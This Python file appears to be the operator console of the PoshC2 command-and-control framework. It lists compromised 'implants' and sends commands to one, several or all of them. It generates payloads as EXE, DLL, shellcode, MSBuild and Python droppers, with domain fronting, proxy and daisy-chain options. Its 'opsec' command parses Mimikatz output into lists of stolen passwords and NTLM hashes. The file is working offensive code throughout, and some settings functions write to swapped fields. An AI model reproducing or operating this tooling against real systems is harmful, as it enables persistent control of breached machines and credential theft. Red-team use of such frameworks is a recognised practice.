#!/usr/bin/python
 
import sys, re, os, time, subprocess, traceback, signal, argparse, readline
from sqlite3 import Error
from Help import logopic, PRECOMMANDS, UXCOMMANDS, SHARPCOMMANDS, COMMANDS, pre_help
from DB import update_item, get_c2server_all, get_implants_all, get_tasks, get_implantdetails, new_urldetails
from DB import get_newimplanturl, get_implantbyid, new_task, get_implants, get_history_dict, get_lastcommand
from DB import new_commandhistory, get_c2urls, del_autorun, del_autoruns, add_autorun, get_autorun, get_newtasks_all
from DB import  drop_newtasks, get_implanttype, update_label, update_sleep, get_history, kill_implant, unhide_implant
from DB import get_pid, get_allurls, get_sharpurls, get_randomuri, get_hostdetails, select_item
from Colours import Colours
from Config import ModulesDirectory, PayloadsDirectory, POSHDIR
from HTML import generate_table, graphviz
from TabComplete import tabCompleter
from Payloads import Payloads
from Utils import validate_sleep_time, randomuri
from PyHandler import handle_py_command
from SharpHandler import handle_sharp_command
from PSHandler import handle_ps_command

if os.name == 'nt':
  import pyreadline.rlmain

def catch_exit(signum, frame):
  sys.exit(0)

def process_mimikatz(lines):
    # code source https://github.com/stufus/parse-mimikatz-log/blob/master/pml.py
    main_count = 0
    current = {}
    all = []
    for line in lines.split('\n'):
        main_count += 1
        val = re.match(r'^\s*\*\s+Username\s+:\s+(.+)\s*$', line.strip())
        if val != None:
            x = process_mimikatzout(current)
            if x not in all:
                if x != None:
                    all.append(x)
            current = {}
            current['Username'] = val.group(1).strip()
            continue
    
        val = re.match(r'^\s*\*\s+(Domain|NTLM|SHA1|Password)\s+:\s+(.+)\s*$', line.strip())
        if val != None:
            if val.group(2).count(" ") < 10:
                current[val.group(1).strip()] = val.group(2)

    return all

def process_mimikatzout(current):
    fields = ['Domain','Username','NTLM','SHA1','Password']
    for f in fields:
        if f in current:
            if current[f] == '(null)':
                current[f] = ''
        else:
            current[f] = ''

    if current['Username'] != '' and (current['Password'] != '' or current['NTLM'] != ''):
        return current['Username'], current['Password'], current['NTLM']

def createproxypayload(user, startup):
  proxyuser = raw_input("Proxy User: e.g. Domain\\user ")
  proxypass = raw_input("Proxy Password: e.g. Password1 ")
  proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
  credsexpire = raw_input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
  update_item("ProxyURL", "C2Server", proxyurl)
  update_item("ProxyUser", "C2Server", proxyuser)
  update_item("ProxyPass", "C2Server", proxypass)
  C2 = get_c2server_all()
  newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
    C2[13], C2[11], "", "", C2[19], C2[20],
    C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
  newPayload.CreateRaw("Proxy")
  newPayload.CreateDlls("Proxy")
  newPayload.CreateShellcode("Proxy")
  newPayload.CreateEXE("Proxy")
  newPayload.CreateMsbuild("Proxy")
  new_urldetails("Proxy", C2[1], C2[3], proxyurl, proxyuser, proxypass, credsexpire)
  startup(user, "Created new proxy payloads")

def createdaisypayload(user, startup):
  name = raw_input("Daisy name: e.g. DC1 ")
  domain = raw_input("Domain or URL: https://www.example.com ")
  daisyurl = raw_input("Daisy host: .e.g. http://10.150.10.1 ")
  daisyport = raw_input("Daisy port: .e.g. 8888 ")
  daisyhostid = raw_input("Select Daisy Implant Host: e.g. 5 ")
  daisyhost = get_implantbyid(daisyhostid)
  proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
  C2 = get_c2server_all()
  newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "",
    "", proxynone, C2[19], C2[20],
    C2[21], "%s?d" % get_newimplanturl(), PayloadsDirectory)
  newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (daisyurl+":"+daisyport),"$pid;%s@%s" % (daisyhost[11],daisyhost[3]))
  newPayload.CreateRaw(name)
  newPayload.CreateDlls(name)
  newPayload.CreateShellcode(name)
  newPayload.CreateEXE(name)
  newPayload.CreateMsbuild(name)
  new_urldetails(name, C2[1], C2[3], domain, daisyurl, daisyhostid, "")
  startup(user, "Created new %s daisy payloads" % name)

def createnewpayload(user, startup):
  domain = raw_input("Domain or URL: https://www.example.com ")
  domainbase = (domain.lower()).replace('https://','')
  domainbase = domainbase.replace('http://','')
  domainfront = raw_input("Domain front URL: e.g. fjdsklfjdskl.cloudfront.net ")
  proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
  randomid = randomuri(5)
  proxyuser = ""
  proxypass = ""
  credsexpire = ""
  if proxyurl:
    proxyuser = raw_input("Proxy User: e.g. Domain\\user ")
    proxypass = raw_input("Proxy Password: e.g. Password1 ")
    credsexpire = raw_input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
    imurl = "%s?p" % get_newimplanturl()
    domainbase = "Proxy%s%s" % (domainbase,randomid)
  else:
    domainbase = "%s%s" % (randomid,domainbase)
    imurl = get_newimplanturl()
  C2 = get_c2server_all()
  newPayload = Payloads(C2[5], C2[2], domain, domainfront, C2[8], proxyuser,
    proxypass, proxyurl, "", "", C2[19], C2[20],
    C2[21], imurl, PayloadsDirectory)
  newPayload.CreateRaw("%s_" % domainbase)
  newPayload.CreateDlls("%s_" % domainbase)
  newPayload.CreateShellcode("%s_" % domainbase)
  newPayload.CreateEXE("%s_" % domainbase)
  newPayload.CreateMsbuild("%s_" % domainbase)
  newPayload.CreatePython("%s_" % domainbase)
  new_urldetails(randomid, domain, domainfront, proxyurl, proxyuser, proxypass, credsexpire)
  startup(user, "Created new payloads")

def complete(text, state):
  for cmd in COMMANDS:
    if cmd.startswith(text):
      if not state:
        return cmd
      else:
        state -= 1

def startup(user, printhelp = ""):

  try:
    if os.name == 'nt':
      os.system('cls')
    else:
      os.system('clear')
  except Exception as e:
    print ("cls")
    print (chr(27) + "[2J")
  print (Colours.GREEN)
  print (logopic)
  #print ("")

  try:
    if user is not None:
      print ("User: " + Colours.END + Colours.BLUE + "%s%s" % (user, Colours.END))
      print ("")
    ii = get_implants()
    if ii:
      for i in ii:
        ID = i[0]
        LastSeen = i[7]
        Hostname = i[3]
        Domain = i[11]
        DomainUser = i[2]
        Arch = i[10]
        PID = i[8]
        Pivot = i[15]
        Sleep = i[13].strip()
        Label = i[16]
        pivot_original = Pivot
        if pivot_original.startswith("PS"):
          Pivot = "PS"
        elif pivot_original.startswith("C#"):
          Pivot = "C#"
        elif pivot_original.startswith("Python"):
          Pivot = "PY"
        if "Daisy" in pivot_original:
          Pivot = Pivot + ";D"
        if "Proxy" in pivot_original:
          Pivot = Pivot + ";P"

        from datetime import datetime, timedelta
        LastSeenTime = datetime.strptime(LastSeen,"%d/%m/%Y %H:%M:%S")
        now = datetime.now()
        if(Sleep.endswith('s')):
          sleep_int = int(Sleep[:-1])
        elif(Sleep.endswith('m')):
          sleep_int = int(Sleep[:-1]) * 60
        elif(Sleep.endswith('h')):
          sleep_int = int(Sleep[:-1]) * 60 * 60
        else:
          print(Colours.RED)
          print("Incorrect sleep format: %s" % Sleep)
          print(Colours.END)
          continue
        nowMinus3Beacons = now - timedelta(seconds=(sleep_int * 3))
        nowMinus10Beacons = now - timedelta(seconds=(sleep_int * 10))
        sID = "["+str(ID)+"]"
        if not Label:
          sLabel = ""
        else:
          sLabel = "["+Label+"]"
        if nowMinus10Beacons > LastSeenTime:
          print (Colours.RED + "%s%s: Seen:%s | PID:%s | %s | %s\\%s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot))
        elif nowMinus3Beacons > LastSeenTime:
          print (Colours.YELLOW + "%s%s: Seen:%s | PID:%s | %s | %s\\%s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot))
        else:
          print (Colours.GREEN + "%s%s: Seen:%s | PID:%s | %s | %s\\%s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, Domain, DomainUser, Hostname, Arch, Pivot))
    else:
      from datetime import datetime, timedelta
      now = datetime.now()
      print (Colours.RED+"No Implants as of: %s" % now.strftime("%d/%m/%Y %H:%M:%S"))
    print (Colours.END+"")
    if printhelp:
      print (printhelp)

    t = tabCompleter()
    t.createListCompleter(PRECOMMANDS)
    readline.set_completer_delims('\t')
    readline.parse_and_bind("tab: complete")
    readline.set_completer(t.listCompleter)
    history = get_history_dict()
    if history:
      for command in history:
        try:
          readline.add_history(command[1])
        except:
          pass

    implant_id = raw_input("Select ImplantID or ALL or Comma Separated List (Enter to refresh):: ")
    print ("")

    if implant_id:
      try:
        last = get_lastcommand()
        if last:
          if last != implant_id:
            new_commandhistory(implant_id)
        else:
          new_commandhistory(implant_id)
      except Exception as e:
        pass
        
    if (implant_id == "") or (implant_id.lower() == "back") or (implant_id.lower() == "clear"):
      startup(user)

    if "output-to-html" in implant_id.lower():
      generate_table("Tasks")
      generate_table("C2Server")
      generate_table("Creds")
      generate_table("Implants")
      graphviz()
      time.sleep(1)
      startup(user)
    if ("show-urls" in implant_id.lower()) or ("list-urls" in implant_id.lower()):
      urls = get_c2urls()
      urlformatted = "RandomID  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
      for i in urls:
        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0],i[1],i[2],i[3],i[4],i[5],i[6],i[7])
      startup(user, urlformatted)
    if "add-autorun" in implant_id.lower():
      autorun = (implant_id.lower()).replace("add-autorun ","")
      autorun = autorun.replace("add-autorun","")
      add_autorun(autorun)
      startup(user, "add-autorun: %s\r\n" % autorun)
    if "list-autorun" in implant_id.lower():
      autoruns = get_autorun()
      startup(user, autoruns)
    if "del-autorun" in implant_id.lower():
      autorun = (implant_id.lower()).replace("del-autorun ","")
      del_autorun(autorun)
      startup(user, "deleted autorun\r\n")
    if "nuke-autorun" in implant_id.lower():
      del_autoruns()
      startup(user, "nuked autoruns\r\n")
    if (implant_id.lower() == "automigrate-frompowershell") or (implant_id.lower() == "am"):
      startup(user, "automigrate not currently implemented for the Python version of PoshC2\r\n")
    if "show-serverinfo" in implant_id.lower():
      i = get_c2server_all()
      detailsformatted = "\nHostnameIP: %s\nEncKey: %s\nDomainFrontHeader: %s\nDefaultSleep: %s\nKillDate: %s\nHTTPResponse: %s\nFolderPath: %s\nServerPort: %s\nQuickCommand: %s\nDefaultProxyURL: %s\nDefaultProxyUser: %s\nDefaultProxyPass: %s\nEnableSounds: %s\nAPIKEY: %s\nMobileNumber: %s\nURLS: %s\n%sSocksURLS: %s\nInsecure: %s\nUserAgent: %s\nReferer: %s\nAPIToken: %s\nAPIUser: %s\nEnableNotifications: %s" % (i[1],i[2],i[3],i[4],i[5],i[6],i[7],i[8],i[9],i[10],i[11],i[12],i[13],i[14],i[15],i[16],i[17],i[18],i[19],i[20],i[21],i[22],i[23],i[24])
      startup(user, detailsformatted)
    if "turnoff-notifications" in implant_id.lower():
      update_item("EnableNotifications", "C2Server", "No")
      startup(user, "Turned off notifications on new implant")
    if "turnon-notifications" in implant_id.lower():
      update_item("EnableNotifications", "C2Server", "Yes")
      startup(user, "Turned on notifications on new implant")
    if "set-clockworksmsapikey" in implant_id.lower():
      cmd = (implant_id.lower()).replace("set-clockworksmsapikey ","")
      cmd = cmd.replace("set-clockworksmsapikey","")
      update_item("MobileNumber", "C2Server", cmd)
      startup(user, "Updated set-clockworksmsapikey: %s\r\n" % cmd)
    if "set-clockworksmsnumber" in implant_id.lower():
      cmd = (implant_id.lower()).replace("set-clockworksmsnumber ","")
      cmd = cmd.replace("set-clockworksmsnumber","")
      update_item("APIKEY", "C2Server", cmd)
      startup(user, "Updated set-clockworksmsnumber (Restart C2 Server): %s\r\n" % cmd)
    if "set-defaultbeacon" in implant_id.lower():
      new_sleep = (implant_id.lower()).replace("set-defaultbeacon ","")
      new_sleep = new_sleep.replace("set-defaultbeacon","")
      if not validate_sleep_time(new_sleep):
        print(Colours.RED)
        print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
        print(Colours.GREEN)
        startup(user)
      else:
        update_item("DefaultSleep", "C2Server", new_sleep)
        startup(user, "Updated set-defaultbeacon (Restart C2 Server): %s\r\n" % new_sleep)
      
    if "opsec" in implant_id.lower():
      implants = get_implants_all()
      comtasks = get_tasks()
      hosts = ""
      uploads = ""
      urls = ""
      users = ""
      creds = ""
      hashes = ""
      for i in implants:
        if i[3] not in hosts:
          hosts += "%s \n" % i[3]
        if i[9] not in urls:
          urls += "%s \n" % i[9]
      for t in comtasks:
        hostname = get_implantdetails(t[1])
        command = t[2].lower()
        output  = t[3].lower()
        if hostname[2] not in users:
          users += "%s\\%s @ %s\n" % (hostname[11], hostname[2],hostname[3])
        if "invoke-mimikatz" in t[2] and "logonpasswords" in t[3]:
          allcreds = process_mimikatz(t[3])
          for cred in allcreds:
            if cred != None:
              if cred[1]:
                creds += cred[0] + " Password: " + cred[1] + "\n"
              if cred[2]:
                hashes += cred[0] + " : NTLM:" + cred[2] + "\n"
        if "uploading file" in command:
          uploadedfile = command
          uploadedfile = uploadedfile.partition("uploading file: ")[2].strip()
          filehash = uploadedfile.partition(" with md5sum:")[2].strip()
          uploadedfile = uploadedfile.partition(" with md5sum:")[0].strip()
          uploadedfile = uploadedfile.strip('"')
          uploads += "%s\t%s\t%s\n" % (hostname[3], filehash, uploadedfile)
        if "installing persistence" in output:
          implant_details = get_implantdetails(t[2])
          line = command.replace('\n','')
          line = line.replace('\r','')
          filenameuploaded = line.rstrip().split(":",1)[1]
          uploads += "%s %s \n" % (implant_details[3], filenameuploaded)
        if "written scf file" in output:
          implant_details = get_implantdetails(t[2])
          uploads += "%s %s\n" % (implant_details[3], output[output.indexof(':'):])
      startup(user, "Users Compromised: \n%s\nHosts Compromised: \n%s\nURLs: \n%s\nFiles Uploaded: \n%s\nCredentials Compromised: \n%s\nHashes Compromised: \n%s" % (users, hosts, urls, uploads, creds, hashes))
    if "listmodules" in implant_id.lower():
      mods = ""
      for modname in os.listdir("%s/Modules/" % POSHDIR):
        mods += "%s\r\n" % modname
      startup(user, mods)
    if "creds" in implant_id.lower():
      startup(user, "creds module not implemented yet")

    if (implant_id.lower() == "pwnself") or (implant_id.lower() == "p"):
      subprocess.Popen(["python", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
      startup(user)

    if (implant_id.lower() == "tasks") or (implant_id.lower() == "tasks "):
      alltasks = ""
      tasks = get_newtasks_all()
      if tasks is None:
        startup(user, "No tasks queued!\r\n")
      else:
        for task in tasks:
          imname = get_implantdetails(task[1])
          alltasks += "(%s) %s\r\n" % ("%s\\%s" % (imname[11],imname[2]),task[2])
        startup(user, "Queued tasks:\r\n\r\n%s" % alltasks)

    if (implant_id.lower() == "cleartasks") or (implant_id.lower() == "cleartasks "):
      drop_newtasks()
      startup(user, "Empty tasks queue\r\n")

    if "quit" in implant_id.lower():
      ri = raw_input("Are you sure you want to quit? (Y/n) ")
      if ri.lower() == "n":
        startup(user)
      if ri == "":
        sys.exit(0)
      if ri.lower() == "y":
        sys.exit(0)
    
    if "createdaisypayload" in implant_id.lower():
      createdaisypayload(user, startup)

    if "createproxypayload" in implant_id.lower():
      createproxypayload(user, startup)

    if "createnewpayload" in implant_id.lower():
      createnewpayload(user, startup)

    if (implant_id == "?") or (implant_id == "help"):
      startup(user, pre_help)
    
    if (implant_id.lower() == "history") or implant_id.lower() == "history ":
      startup(user, get_history())

    if "use " in implant_id.lower():
      implant_id = implant_id.replace("use ","")
      params = re.compile("use ", re.IGNORECASE)
      implant_id = params.sub("", implant_id)

    commandloop(implant_id, user)
  except Exception as e:
    if 'unable to open database file' in e:
      startup(user)
    else:
      traceback.print_exc()
      print ("Error: %s" % e)
      print ("Currently no valid implants: sleeping for 10 seconds")
      time.sleep(10)
      startup(user)

def runcommand(command, randomuri):
  if command:
    try:
      last = get_lastcommand()
      if last:
        if last != command:
          new_commandhistory(command)
      else:
        new_commandhistory(command)
    except Exception as e:
      pass

  implant_type = get_implanttype(randomuri)
  if implant_type == "OSX":
    handle_py_command(command, user, randomuri, startup)

  elif implant_type == "C#":
    handle_sharp_command(command, user, randomuri, startup) 
      
  else:
    handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload)
    return

def commandloop(implant_id, user):
  while(True):
    try:
      implant_id_orig = implant_id
      t = tabCompleter()
      t.createListCompleter(COMMANDS)
      readline.set_completer_delims('\t')
      readline.parse_and_bind("tab: complete")
      readline.set_completer(t.listCompleter)
      if ("-" in implant_id.lower()) or ("all" in implant_id.lower()) or ("," in implant_id.lower()):
        print (Colours.GREEN)
        command = raw_input("%s> " % (implant_id))
      else:
        hostname = get_hostdetails(implant_id)
        if hostname[15] == 'OSX':
          t.createListCompleter(UXCOMMANDS)
          readline.set_completer_delims('\t')
          readline.parse_and_bind("tab: complete")
          readline.set_completer(t.listCompleter)
        if hostname[15] == 'C#':
          t.createListCompleter(SHARPCOMMANDS)
          readline.set_completer_delims('\t')
          readline.parse_and_bind("tab: complete")
          readline.set_completer(t.listCompleter)
        print (Colours.GREEN)
        print ("%s\\%s @ %s (PID:%s)" % (hostname[11],hostname[2], hostname[3],hostname[8]))
        command = raw_input("%s> " % (implant_id))

      # if "all" run through all implants get_implants()
      if implant_id.lower() == "all":
        if command == "back":
          startup(user)
        implant_split = get_implants()
        if implant_split:
          for implant_id in implant_split:
            runcommand(command, implant_id[1])
      # if "seperated list" against single uri
      elif "," in implant_id:
        implant_split = implant_id.split(",")
        for implant_id in implant_split:
          implant_id = get_randomuri(implant_id)
          runcommand(command, implant_id)
      # if "range" against single uri
      elif "-" in implant_id:
        implant_split = implant_id.split("-")
        for implant_id in range(int(implant_split[0]), int(implant_split[1])+1):
          try:
            implant_id = get_randomuri(implant_id)
            runcommand(command, implant_id)
          except Exception as e:
            print ("Unknown ImplantID")
      # else run against single uri
      else:
        implant_id = get_randomuri(implant_id)
        runcommand(command, implant_id)

      # then run back around
      commandloop(implant_id_orig, user) #is this required for a while loop? looks like it would lead to a stackoverflow anyway?

    except Exception as e:
      print (Colours.RED)
      print ("Error running against the selected implant ID, ensure you have typed the correct information")
      print (Colours.END)
      #traceback.print_exc()
      #print "Error: %s" % e
      # remove the following comment when publishing to live
      time.sleep(1)
      startup(user, user)

if __name__ == '__main__':
  original_sigint = signal.getsignal(signal.SIGINT)
  signal.signal(signal.SIGINT, catch_exit)
  parser = argparse.ArgumentParser(description='The command line for handling implants in PoshC2')
  parser.add_argument('-u', '--user', help='the user for this session')
  args = parser.parse_args()
  user = args.user
  if user is None:
    user = raw_input("Enter your username: ")
  startup(user)
